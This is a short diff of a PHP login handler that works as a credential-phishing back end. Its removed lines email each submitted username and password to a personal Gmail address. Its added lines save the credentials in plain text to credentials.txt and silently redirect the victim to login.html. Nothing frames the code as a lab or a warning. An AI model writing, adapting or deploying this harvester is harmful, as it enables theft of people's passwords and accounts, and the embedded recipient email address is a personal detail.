@@ -4,29 +4,18 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST["username"];
     $password = $_POST["password"];
 
-    // Specify the recipient email address
-    $to = "badrdev08@gmail.com";
+    // Open the text file in append mode
+    $file = fopen("credentials.txt", "a");
 
-    // Set the subject of the email
-    $subject = "Login Credentials";
+    // Write the username and password to the text file
+    fwrite($file, "Username: " . $username . "\nPassword: " . $password . "\n\n");
 
-    // Set the body of the email
-    $message = "Username: " . $username . "\nPassword: " . $password;
+    // Close the file
+    fclose($file);
 
-    // Set additional headers
-    $headers = "From: webmaster@example.com" . "\r\n" .
-               "Reply-To: webmaster@example.com" . "\r\n" .
-               "X-Mailer: PHP/" . phpversion();
-
-    // Send the email
-    $success = mail($to, $subject, $message, $headers);
-
-    // Check if the email was sent successfully
-    if ($success) {
-        echo "Email sent successfully!";
-    } else {
-        echo "Failed to send email. Please try again later.";
-    }
+    // Redirect the user back to the login page
+    header("Location: login.html");
+    exit();
 } else {
     echo "Invalid request method.";
 }
